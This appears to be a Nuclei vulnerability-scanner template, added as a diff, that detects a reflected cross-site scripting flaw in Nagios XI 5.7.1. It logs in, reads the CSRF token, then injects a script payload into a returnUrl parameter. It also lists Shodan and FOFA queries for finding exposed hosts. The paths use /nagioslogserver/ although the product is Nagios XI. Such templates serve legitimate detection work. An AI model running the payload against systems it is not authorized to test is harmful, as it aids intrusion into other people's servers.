@@ -1,0 +1,69 @@
+id: nagios-xi-xss
+
+info:
+  name: Nagios XI 5.7.1 - Cross-Site Scripting
+  author: ritikchaddha
+  severity: medium
+  description: |
+    A reflected cross-site scripting (XSS) in Nagios XI 5.7.1 can result in an attacker performing malicious actions to users who open a maliciously crafted link or third-party web page.
+  reference:
+    - https://github.com/EmreOvunc/Nagios-XI-Reflected-XSS?tab=readme-ov-file
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-79
+    epss-score: 0.07062
+    epss-percentile: 0.94141
+    cpe: cpe:2.3:a:nagios:nagios_xi:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 3
+    vendor: nagios
+    product: nagios_xi
+    shodan-query: http.favicon.hash:1460499495
+    fofa-query: icon_hash="1460499495"
+  tags: nagios,nagiosxi,xss,authenticated
+
+http:
+  - raw:
+      - |
+        GET /nagioslogserver/login HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /nagioslogserver/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_ls={{csrf}}&username={{username}}&password={{password}}
+
+      - |
+        GET /nagioslogserver/includes/components/ccm/?cmd=modify&id=1&page=1&returnUrl=%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&type=host HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_3
+        words:
+          - '"</script><script>alert(document.domain)</script>'
+          - '>Cancel</a>'
+        condition: and
+
+      - type: word
+        part: header_3
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        group: 1
+        regex:
+          - "name=['\"]csrf_ls['\"] value=['\"](.*)['\"](.*)>"
+        internal: true
+# digest: 4b0a00483046022100eac7a17b580bdc1ab94ca1de2423a7d168957a2b8907cd5207154fb60bb6f7af022100994b6df962fa85ccccd0c594acd73649c8e3bf177f7d45d1382544cedd2b9b93:922c64590222798bb761d5b6d8e72950
